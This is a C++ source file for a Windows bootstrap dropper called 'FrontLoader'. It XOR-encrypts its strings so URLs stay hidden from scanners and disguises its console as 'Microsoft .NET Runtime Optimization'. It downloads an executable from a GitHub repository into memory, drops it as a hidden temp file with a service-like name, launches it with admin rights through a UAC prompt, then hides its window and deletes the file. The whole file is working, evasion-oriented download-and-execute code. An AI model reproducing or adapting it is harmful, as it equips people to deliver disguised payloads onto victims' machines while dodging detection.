/*
 * FrontLoader — lightweight bootstrap that downloads and runs the main loader.
 * All strings XOR-encrypted at compile time. Zero plaintext URLs in the binary.
 */
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <shellapi.h>
#include <wininet.h>
#include <cstdint>
#include <cstring>
#include <cstdio>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(linker, "/SUBSYSTEM:CONSOLE")

// ── Compile-time XOR string encryption ──────────────────────────
// Simple but effective: no plaintext URLs/paths in the binary.
// Key rotates per character position.

template<size_t N>
struct EncStr {
    char data[N];
    static constexpr char KEY = 0x5A;

    constexpr EncStr(const char(&src)[N]) : data{} {
        for (size_t i = 0; i < N; i++)
            data[i] = src[i] ^ (KEY + (char)(i & 0xF));
    }

    void decrypt(char* out) const {
        for (size_t i = 0; i < N; i++)
            out[i] = data[i] ^ (KEY + (char)(i & 0xF));
    }
};

#define ENC(s) []() -> const char* { \
    static constexpr EncStr<sizeof(s)> e(s); \
    static char buf[sizeof(s)]; \
    static bool done = false; \
    if (!done) { e.decrypt(buf); done = true; } \
    return buf; \
}()

// ── Download to memory via WinInet ──────────────────────────────
static bool DownloadToMemory(const char* url, void** outBuf, DWORD* outSize) {
    *outBuf = nullptr;
    *outSize = 0;

    HINTERNET hInet = InternetOpenA(
        ENC("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
        INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInet) {
        DWORD err = GetLastError();
        printf("  [!] InternetOpen failed (error %lu)\n", err);
        return false;
    }

    HINTERNET hUrl = InternetOpenUrlA(hInet, url, nullptr, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (!hUrl) {
        DWORD err = GetLastError();
        printf("  [!] InternetOpenUrl failed (error %lu) for URL: %s\n", err, url);
        InternetCloseHandle(hInet);
        return false;
    }

    // Read in chunks
    DWORD capacity = 1024 * 1024; // 1MB initial
    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, capacity, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { InternetCloseHandle(hUrl); InternetCloseHandle(hInet); return false; }

    DWORD total = 0, bytesRead = 0;
    while (true) {
        if (!InternetReadFile(hUrl, buf + total, 8192, &bytesRead)) {
            DWORD err = GetLastError();
            printf("  [!] InternetReadFile failed (error %lu) after %lu bytes\n", err, total);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInet);
            SecureZeroMemory(buf, total);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }
        if (bytesRead == 0) break; // EOF
        
        total += bytesRead;
        if (total + 8192 > capacity) {
            capacity *= 2;
            BYTE* newBuf = (BYTE*)VirtualAlloc(nullptr, capacity, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!newBuf) break;
            memcpy(newBuf, buf, total);
            SecureZeroMemory(buf, total);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = newBuf;
        }
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);

    if (total < 4096) { // Too small to be a valid PE
        SecureZeroMemory(buf, total);
        VirtualFree(buf, 0, MEM_RELEASE);
        return false;
    }

    // Validate PE
    if (buf[0] != 'M' || buf[1] != 'Z') {
        SecureZeroMemory(buf, total);
        VirtualFree(buf, 0, MEM_RELEASE);
        return false;
    }

    *outBuf = buf;
    *outSize = total;
    return true;
}

// ── Generate random filename ────────────────────────────────────
static void RandomFileName(wchar_t* out, size_t maxLen) {
    DWORD tick = GetTickCount();
    DWORD pid = GetCurrentProcessId();
    unsigned seed = tick ^ (pid << 16) ^ (pid >> 16);

    const wchar_t chars[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    const int cLen = 36;

    // Pattern: svc_XXXXXXXX.tmp (looks like a Windows service temp file)
    wcscpy_s(out, maxLen, L"svc_");
    for (int i = 0; i < 8; i++) {
        seed = seed * 1103515245 + 12345;
        out[4 + i] = chars[(seed >> 16) % cLen];
    }
    out[12] = L'\0';
    wcscat_s(out, maxLen, L".exe");
}

// ── Entry point ─────────────────────────────────────────────────
int main() {
    SetConsoleTitleA(ENC("Microsoft .NET Runtime Optimization"));

    printf("  Initializing...\n");

    // URLs (encrypted — not visible in binary strings)
    const char* primaryUrl = ENC("https://github.com/IsaiahNulled/loader/raw/refs/heads/main/Loader/Loader.exe");
    const char* fallbackUrl = ENC("https://raw.githubusercontent.com/IsaiahNulled/loader/refs/heads/main/Loader/Loader.exe");

    // Download to memory
    void* peBuf = nullptr;
    DWORD peSize = 0;

    printf("  Downloading...\n");
    if (!DownloadToMemory(primaryUrl, &peBuf, &peSize)) {
        printf("  Primary failed, trying fallback...\n");
        if (!DownloadToMemory(fallbackUrl, &peBuf, &peSize)) {
            printf("  [!] Download failed. Check internet connection.\n");
            printf("  Press Enter to exit...\n");
            getchar();
            return 1;
        }
    }
    printf("  Downloaded %lu bytes.\n", peSize);

    // Write to random temp file
    wchar_t tempDir[MAX_PATH + 1] = {};
    GetTempPathW(MAX_PATH, tempDir);

    wchar_t rndName[32] = {};
    RandomFileName(rndName, 32);

    wchar_t tempPath[MAX_PATH + 64] = {};
    wsprintfW(tempPath, L"%s%s", tempDir, rndName);

    // Write normally — FILE_FLAG_DELETE_ON_CLOSE conflicts with ShellExecuteEx
    HANDLE hFile = CreateFileW(tempPath, GENERIC_WRITE, 0,
                               nullptr, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("  [!] Failed to write temp file (error %lu).\n", GetLastError());
        SecureZeroMemory(peBuf, peSize);
        VirtualFree(peBuf, 0, MEM_RELEASE);
        printf("  Press Enter to exit...\n");
        getchar();
        return 1;
    }

    DWORD written;
    WriteFile(hFile, peBuf, peSize, &written, nullptr);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    // Wipe download buffer
    SecureZeroMemory(peBuf, peSize);
    VirtualFree(peBuf, 0, MEM_RELEASE);

    // Launch as admin via ShellExecuteEx with "runas" verb (triggers UAC prompt)
    printf("  Launching (admin)...\n");

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";
    sei.lpFile = tempPath;
    sei.nShow = SW_SHOWNORMAL;

    if (ShellExecuteExW(&sei) && sei.hProcess) {
        // Hide our own console window — loader is running
        HWND hConsole = GetConsoleWindow();
        if (hConsole) ShowWindow(hConsole, SW_HIDE);

        // Wait for loader to finish
        WaitForSingleObject(sei.hProcess, INFINITE);
        CloseHandle(sei.hProcess);
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_CANCELLED) {
            printf("  [!] UAC prompt was cancelled. Loader requires admin.\n");
        } else {
            printf("  [!] Failed to launch (error %lu).\n", err);
        }
        printf("  Press Enter to exit...\n");
        getchar();
    }

    // Clean up temp file
    DeleteFileW(tempPath);
    MoveFileExW(tempPath, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);

    return 0;
}
